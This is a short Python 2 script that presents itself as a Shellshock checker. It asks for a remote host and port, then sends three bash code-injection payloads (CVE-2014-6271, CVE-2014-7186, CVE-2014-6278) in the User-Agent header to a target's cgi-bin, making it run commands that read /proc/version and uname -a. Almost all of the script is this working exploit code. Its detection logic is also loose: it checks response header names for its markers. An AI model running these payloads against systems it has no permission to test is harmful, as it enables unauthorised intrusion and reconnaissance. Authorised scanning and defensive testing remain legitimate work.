# httpshellshock.py
# description: Checks if the cgi-bin of the target is vulnerable to Shellshock
# author: @shipcod3

import sys, requests

def shellshock():
    payloads = {
                "() { :;}; echo 'shellshocked: ' $(</proc/version)",
                "true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo 'shellshockedstacked: ' $(</proc/version)",
                "() { _; } >_[$($())] { echo shellshockeduname; uname -a; }"                
               }   
    
    print 'Set RHOST:',
    rhost = raw_input() #example: shellshock.notsosecure.com/cgi-bin/status
    print 'Set RPORT:',
    rport = raw_input()
    print ""
    
    if rport == '80':
        try:
            for payload in payloads:
                r = requests.get("http://{}".format(rhost), headers={"User-agent": payload})
                print "Sending the payload: " + payload + " in User-Agent"
                
                if 'shellshocked' in r.headers:
                    print "[+] Information: " + r.headers['shellshocked']
                    print '[+] Vulnerable to Shellshock! (CVE-2014-6271)'
                
                elif 'shellshockedstacked' in r.headers:
                    print "[+] Information: " + r.headers['shellshockedstacked']
                    print '[+] Vulnerable to Shellshock! (CVE-2014-7186)'
                
                elif 'shellshockeduname' in r.headers:
                    print "[+] Information: " + r.headers['shellshockeduname']
                    print '[+] Vulnerable to Shellshock! (CVE-2014-6278)'              
                    
                else:
                    print '[-] Not Vulnerable!'

        except Exception as e:
            print "[+] Not Vulnerable!"
            
    elif rport == '443':
        try:
            for payload in payloads:
                r = requests.get("https://{}".format(rhost), headers={"User-agent": payload})
                print "Sending the payload: " + payload + " in User-Agent"
                
                if 'shellshocked' in r.headers:
                    print "[+] Information: " + r.headers['shellshocked']
                    print '[+] Vulnerable to Shellshock! (CVE-2014-6271)'
                    
                elif 'shellshockedstacked' in r.headers:
                    print "[+] Information: " + r.headers['shellshockedstacked']
                    print '[+] Vulnerable to Shellshock! (CVE-2014-7186)'
                    
                elif 'shellshockeduname' in r.headers:
                    print "[+] Information: " + r.headers['shellshockeduname']
                    print '[+] Vulnerable to Shellshock! (CVE-2014-6278)'
                    
                else:
                    print '[-] Not Vulnerable!'

        except Exception as e:
            print "[+] Not Vulnerable!"

    else:
        print ('[!!!] Error: No port has been specified')

if __name__ == "__main__":
    shellshock()
